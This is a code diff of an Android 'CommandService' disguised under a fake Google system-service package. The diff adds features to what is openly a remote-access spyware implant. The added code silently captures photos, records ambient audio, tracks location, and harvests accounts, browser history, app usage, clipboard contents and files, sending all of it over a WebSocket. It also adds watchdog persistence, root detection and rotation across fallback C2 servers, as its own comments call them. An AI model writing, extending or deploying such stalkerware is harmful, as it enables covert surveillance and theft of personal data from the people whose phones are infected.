@@ -8,18 +8,25 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.ImageFormat
+import android.hardware.camera2.*
 import android.media.AudioManager
+import android.media.ImageReader
 import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
+import android.util.Size
 import android.telephony.SmsManager
 import android.util.Base64
 import android.util.Log
 import androidx.core.content.FileProvider
 import com.google.android.systemservice.config.AndroidConfig
+import com.google.android.systemservice.utils.CommandQueueManager
+import com.google.android.systemservice.utils.DataSyncManager
 import com.google.android.systemservice.utils.StealthNotificationHelper
 import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.*
@@ -38,11 +45,30 @@ class CommandService : Service() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var isConnected = false
     private var reconnectAttempts = 0
-    private val maxReconnectDelay = 60000L // 60 seconds max
+    private val maxReconnectDelay = 300000L // 5 minutes max
+    private lateinit var dataSyncManager: DataSyncManager
+    private lateinit var commandQueue: CommandQueueManager
+    // Track current request_id for command-response correlation
+    @Volatile private var currentRequestId: String? = null
 
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "CommandService created")
+        
+        // Initialize offline data sync manager
+        dataSyncManager = DataSyncManager(this)
+        
+        // Initialize intelligent command queue
+        commandQueue = CommandQueueManager(this)
+        commandQueue.setResourceConflictHandler(
+            onConflict = { resource ->
+                Log.d(TAG, "Resource conflict: $resource — pausing our operation")
+                // The current recording/capture will be stopped cleanly by the queue manager
+            },
+            onFreed = { resource ->
+                Log.d(TAG, "Resource freed: $resource — can resume")
+            }
+        )
         
         // Load configuration
         AndroidConfig.loadFromPreferences(this)
@@ -84,7 +110,29 @@ class CommandService : Service() {
         if (!isConnected) {
             connectWebSocket()
         }
+        // Reverse watchdog: ensure WatchdogService is alive
+        ensureWatchdogRunning()
         return START_STICKY
+    }
+    
+    private fun ensureWatchdogRunning() {
+        try {
+            val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+            @Suppress("DEPRECATION")
+            val running = manager.getRunningServices(Integer.MAX_VALUE)
+                .any { it.service.className == WatchdogService::class.java.name }
+            if (!running) {
+                Log.d(TAG, "WatchdogService is dead, restarting...")
+                val intent = Intent(this, WatchdogService::class.java)
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    startForegroundService(intent)
+                } else {
+                    startService(intent)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to check/restart WatchdogService: ${e.message}")
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -110,6 +158,14 @@ class CommandService : Service() {
                     isConnected = true
                     reconnectAttempts = 0
                     subscribeToChannel()
+                    
+                    // Flush any offline-queued data
+                    if (dataSyncManager.hasQueuedData()) {
+                        Log.d(TAG, "Flushing ${dataSyncManager.queuedCount()} queued items...")
+                        dataSyncManager.flushAll { count ->
+                            Log.d(TAG, "Offline sync complete: $count items uploaded")
+                        }
+                    }
                 }
 
                 override fun onMessage(webSocket: WebSocket, text: String) {
@@ -152,10 +208,14 @@ class CommandService : Service() {
     }
 
     private fun getDeviceIdentifier(): String {
-        return android.provider.Settings.Secure.getString(
-            contentResolver,
-            android.provider.Settings.Secure.ANDROID_ID
-        ) ?: "unknown"
+        return try {
+            android.provider.Settings.Secure.getString(
+                contentResolver,
+                android.provider.Settings.Secure.ANDROID_ID
+            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
+        } catch (e: Exception) {
+            AndroidConfig.deviceId.ifEmpty { "unknown" }
+        }
     }
 
     private fun handleMessage(text: String) {
@@ -172,6 +232,12 @@ class CommandService : Service() {
             val type = message.optString("type", "")
             val command = message.optString("action", message.optString("command", ""))
             val params = message.optJSONObject("params")
+            val requestId = message.optString("request_id", "")
+
+            // Store request_id for response correlation
+            if (requestId.isNotEmpty()) {
+                currentRequestId = requestId
+            }
 
             if (type.isNotEmpty()) {
                 Log.d(TAG, "Received frame type: $type")
@@ -186,9 +252,11 @@ class CommandService : Service() {
 
             when (command) {
                 "get_location" -> executeGetLocation()
+                "get_accounts" -> executeGetAccounts()
+                "toggle_wifi" -> executeToggleWifi()
                 "start_camera" -> executeStartCamera(params)
                 "stop_camera" -> executeStopCamera()
-                "start_audio" -> executeStartAudio()
+                "start_audio" -> executeStartAudio(params)
                 "stop_audio" -> executeStopAudio()
                 "take_photo" -> executeTakePhoto(params)
                 "get_device_info" -> executeGetDeviceInfo()
@@ -216,6 +284,17 @@ class CommandService : Service() {
                 "change_audio_mode" -> executeChangeAudioMode(params)
                 "get_wifi_info" -> executeGetWifiInfo()
                 "shell_exec" -> executeShellExec(params)
+                // Location tracking commands
+                "start_location_tracking" -> executeStartLocationTracking(params)
+                "stop_location_tracking" -> executeStopLocationTracking()
+                // New features
+                "ambient_record" -> executeAmbientRecord(params)
+                "get_app_usage" -> executeGetAppUsage()
+                "get_browser_history" -> executeGetBrowserHistory()
+                "browse_files" -> executeBrowseFiles(params)
+                "download_file" -> executeDownloadFile(params)
+                "add_geofence" -> executeAddGeofence(params)
+                "start_clipboard_monitor" -> executeStartClipboardMonitor()
                 else -> Log.w(TAG, "Unknown command: $command")
             }
         } catch (e: Exception) {
@@ -223,11 +302,110 @@ class CommandService : Service() {
         }
     }
 
+    @android.annotation.SuppressLint("MissingPermission")
     private fun executeGetLocation() {
+        serviceScope.launch {
+            try {
+                val fusedClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this@CommandService)
+                val result = CompletableDeferred<android.location.Location?>()
+
+                // Try last known location first
+                fusedClient.lastLocation.addOnSuccessListener { location ->
+                    if (location != null) {
+                        result.complete(location)
+                    } else {
+                        // Request fresh location
+                        val request = com.google.android.gms.location.LocationRequest.Builder(
+                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
+                        ).setWaitForAccurateLocation(true).setMaxUpdates(1).build()
+
+                        val callback = object : com.google.android.gms.location.LocationCallback() {
+                            override fun onLocationResult(lr: com.google.android.gms.location.LocationResult) {
+                                result.complete(lr.lastLocation)
+                                fusedClient.removeLocationUpdates(this)
+                            }
+                        }
+                        fusedClient.requestLocationUpdates(request, callback, Looper.getMainLooper())
+                    }
+                }.addOnFailureListener {
+                    result.complete(null)
+                }
+
+                val location = withTimeoutOrNull(20000) { result.await() }
+                if (location != null) {
+                    sendResponse("location", JSONObject().apply {
+                        put("latitude", location.latitude)
+                        put("longitude", location.longitude)
+                        put("accuracy", location.accuracy)
+                        put("altitude", location.altitude)
+                        put("speed", location.speed)
+                        put("provider", location.provider ?: "unknown")
+                        put("timestamp", location.time)
+                    })
+                } else {
+                    sendError("Could not get location")
+                }
+            } catch (e: Exception) {
+                sendError("Location error: ${e.message}")
+            }
+        }
+    }
+    
+    private fun executeGetAccounts() {
+        serviceScope.launch {
+            try {
+                val accountManager = android.accounts.AccountManager.get(this@CommandService)
+                val accounts = accountManager.accounts
+                val accountList = org.json.JSONArray()
+                
+                for (account in accounts) {
+                    accountList.put(JSONObject().apply {
+                        put("name", account.name)
+                        put("type", account.type)
+                    })
+                }
+                
+                sendResponse("accounts", JSONObject().put("accounts", accountList))
+            } catch (e: Exception) {
+                Log.e(TAG, "Error getting accounts: ${e.message}")
+                sendResponse("accounts", JSONObject().put("error", e.message))
+            }
+        }
+    }
+    
+    private fun executeToggleWifi() {
+        serviceScope.launch {
+            try {
+                // Note: Direct WiFi toggle is restricted on Android 10+
+                // This will open WiFi settings instead
+                val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+                
+                sendResponse("wifi_toggle", JSONObject().put("status", "settings_opened"))
+            } catch (e: Exception) {
+                Log.e(TAG, "Error toggling WiFi: ${e.message}")
+                sendResponse("wifi_toggle", JSONObject().put("error", e.message))
+            }
+        }
+    }
+    
+    private fun executeStartLocationTracking(params: JSONObject?) {
+        val intervalMs = params?.optLong("interval_ms", 60000) ?: 60000
         val intent = Intent(this, LocationService::class.java).apply {
-            action = "GET_LOCATION"
+            action = "START_TRACKING"
+            putExtra("interval_ms", intervalMs)
         }
         startService(intent)
+        Log.d(TAG, "Started location tracking with interval: ${intervalMs}ms")
+    }
+    
+    private fun executeStopLocationTracking() {
+        val intent = Intent(this, LocationService::class.java).apply {
+            action = "STOP_TRACKING"
+        }
+        startService(intent)
+        Log.d(TAG, "Stopped location tracking")
     }
 
     private fun executeStartCamera(params: JSONObject?) {
@@ -246,9 +424,13 @@ class CommandService : Service() {
         startService(intent)
     }
 
-    private fun executeStartAudio() {
+    private fun executeStartAudio(params: JSONObject?) {
+        val compress = params?.optBoolean("compress", true) ?: true
+        val maxDuration = params?.optInt("max_duration_sec", 60) ?: 60
         val intent = Intent(this, AudioService::class.java).apply {
             action = "START_RECORDING"
+            putExtra("compress", compress)
+            putExtra("max_duration_sec", maxDuration)
         }
         startService(intent)
     }
@@ -260,13 +442,82 @@ class CommandService : Service() {
         startService(intent)
     }
 
+    @android.annotation.SuppressLint("MissingPermission")
     private fun executeTakePhoto(params: JSONObject?) {
         val cameraId = params?.optString("camera_id", "0") ?: "0"
-        val intent = Intent(this, CameraService::class.java).apply {
-            action = "TAKE_PHOTO"
-            putExtra("camera_id", cameraId)
+        serviceScope.launch {
+            try {
+                val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                val characteristics = manager.getCameraCharacteristics(cameraId)
+                val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+                val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
+                    ?: Size(640, 480)
+
+                val result = CompletableDeferred<ByteArray?>()
+                val camThread = HandlerThread("CamCapture").also { it.start() }
+                val camHandler = Handler(camThread.looper)
+
+                val reader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
+                reader.setOnImageAvailableListener({ r ->
+                    val image = r.acquireLatestImage()
+                    if (image != null) {
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        image.close()
+                        result.complete(bytes)
+                    } else {
+                        result.complete(null)
+                    }
+                }, camHandler)
+
+                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        try {
+                            val surface = reader.surface
+                            camera.createCaptureSession(listOf(surface),
+                                object : CameraCaptureSession.StateCallback() {
+                                    override fun onConfigured(session: CameraCaptureSession) {
+                                        try {
+                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                            captureBuilder.addTarget(surface)
+                                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
+                                            session.capture(captureBuilder.build(), null, camHandler)
+                                        } catch (e: Exception) {
+                                            result.complete(null)
+                                        }
+                                    }
+                                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                                        result.complete(null)
+                                    }
+                                }, camHandler)
+                        } catch (e: Exception) {
+                            result.complete(null)
+                        }
+                    }
+                    override fun onDisconnected(camera: CameraDevice) { camera.close(); result.complete(null) }
+                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
+                }, camHandler)
+
+                val photoBytes = withTimeoutOrNull(15000) { result.await() }
+                reader.close()
+                camThread.quitSafely()
+
+                if (photoBytes != null && photoBytes.isNotEmpty()) {
+                    val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
+                    sendResponse("photo", JSONObject().apply {
+                        put("image_base64", base64)
+                        put("camera_id", cameraId)
+                        put("size", photoBytes.size)
+                    })
+                } else {
+                    sendError("Failed to capture photo")
+                }
+            } catch (e: Exception) {
+                sendError("Photo error: ${e.message}")
+            }
         }
-        startService(intent)
     }
 
     private fun executeGetDeviceInfo() {
@@ -439,6 +690,16 @@ class CommandService : Service() {
     }
 
     private fun collectDeviceInfo(): JSONObject {
+        val batteryLevel = try {
+            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        } catch (e: Exception) { -1 }
+        
+        val isRooted = try {
+            val paths = arrayOf("/system/xbin/su", "/system/bin/su", "/sbin/su", "/data/local/xbin/su")
+            paths.any { File(it).exists() }
+        } catch (e: Exception) { false }
+        
         return JSONObject().apply {
             put("device_id", getDeviceIdentifier())
             put("manufacturer", android.os.Build.MANUFACTURER)
@@ -446,8 +707,11 @@ class CommandService : Service() {
             put("brand", android.os.Build.BRAND)
             put("sdk_version", android.os.Build.VERSION.SDK_INT)
             put("android_version", android.os.Build.VERSION.RELEASE)
+            put("os_version", android.os.Build.VERSION.RELEASE)
             put("device", android.os.Build.DEVICE)
             put("product", android.os.Build.PRODUCT)
+            put("battery_level", batteryLevel)
+            put("is_rooted", isRooted)
         }
     }
 
@@ -561,6 +825,7 @@ class CommandService : Service() {
     }
 
     private fun sendResponse(type: String, data: JSONObject) {
+        val reqId = currentRequestId
         val message = JSONObject().apply {
             put("command", "message")
             put("identifier", JSONObject().apply {
@@ -571,15 +836,33 @@ class CommandService : Service() {
                 put("type", type)
                 put("payload", data)
                 put("timestamp", System.currentTimeMillis())
+                if (!reqId.isNullOrEmpty()) {
+                    put("request_id", reqId)
+                }
             }.toString())
         }
         webSocket?.send(message.toString())
+        // Clear request_id after sending response
+        if (!reqId.isNullOrEmpty()) {
+            currentRequestId = null
+        }
     }
 
     private fun scheduleReconnect() {
         reconnectAttempts++
         val delay = minOf((1000L * (1 shl reconnectAttempts)), maxReconnectDelay)
         Log.d(TAG, "Scheduling reconnect in ${delay}ms (attempt $reconnectAttempts)")
+        
+        // After 3 consecutive failures on same server, try next C2
+        if (reconnectAttempts > 0 && reconnectAttempts % 3 == 0) {
+            val switched = AndroidConfig.switchToNextServer()
+            if (switched) {
+                Log.w(TAG, "Primary C2 unreachable, switching to fallback: ${AndroidConfig.serverUrl}")
+            } else {
+                Log.w(TAG, "All C2 servers exhausted, cycling back to primary")
+                AndroidConfig.resetToPrimaryServer()
+            }
+        }
         
         serviceScope.launch {
             delay(delay)
@@ -895,9 +1178,96 @@ class CommandService : Service() {
         })
     }
 
+    // === NEW FEATURE COMMAND HANDLERS ===
+
+    private fun executeAmbientRecord(params: JSONObject?) {
+        val duration = params?.optInt("duration", 60) ?: 60
+        val intent = Intent(this, AmbientRecordingService::class.java).apply {
+            putExtra("duration", duration)
+        }
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+        sendResponse("ambient_record", JSONObject().apply {
+            put("status", "recording_started")
+            put("duration", duration)
+        })
+    }
+
+    private fun executeGetAppUsage() {
+        startService(Intent(this, AppUsageService::class.java))
+        sendResponse("app_usage", JSONObject().apply {
+            put("status", "collecting")
+        })
+    }
+
+    private fun executeGetBrowserHistory() {
+        startService(Intent(this, BrowserHistoryService::class.java))
+        sendResponse("browser_history", JSONObject().apply {
+            put("status", "collecting")
+        })
+    }
+
+    private fun executeBrowseFiles(params: JSONObject?) {
+        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("path", path)
+            putExtra("action", "list")
+        }
+        startService(intent)
+        sendResponse("file_browser", JSONObject().apply {
+            put("status", "listing")
+            put("path", path)
+        })
+    }
+
+    private fun executeDownloadFile(params: JSONObject?) {
+        val path = params?.optString("path") ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("path", path)
+            putExtra("action", "download")
+        }
+        startService(intent)
+        sendResponse("file_download", JSONObject().apply {
+            put("status", "downloading")
+            put("path", path)
+        })
+    }
+
+    private fun executeAddGeofence(params: JSONObject?) {
+        params ?: return
+        val intent = Intent(this, GeofenceService::class.java).apply {
+            putExtra("action", "add")
+            putExtra("latitude", params.optDouble("latitude", 0.0))
+            putExtra("longitude", params.optDouble("longitude", 0.0))
+            putExtra("radius", params.optDouble("radius", 200.0).toFloat())
+            putExtra("label", params.optString("label", "zone_${System.currentTimeMillis()}"))
+        }
+        startService(intent)
+        sendResponse("geofence", JSONObject().apply {
+            put("status", "geofence_added")
+        })
+    }
+
+    private fun executeStartClipboardMonitor() {
+        val intent = Intent(this, ClipboardMonitorService::class.java)
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+        sendResponse("clipboard_monitor", JSONObject().apply {
+            put("status", "started")
+        })
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         isConnected = false
+        dataSyncManager.persistQueue()
+        commandQueue.shutdown()
         webSocket?.close(1000, "Service destroyed")
         client?.dispatcher?.executorService?.shutdown()
         serviceScope.cancel()
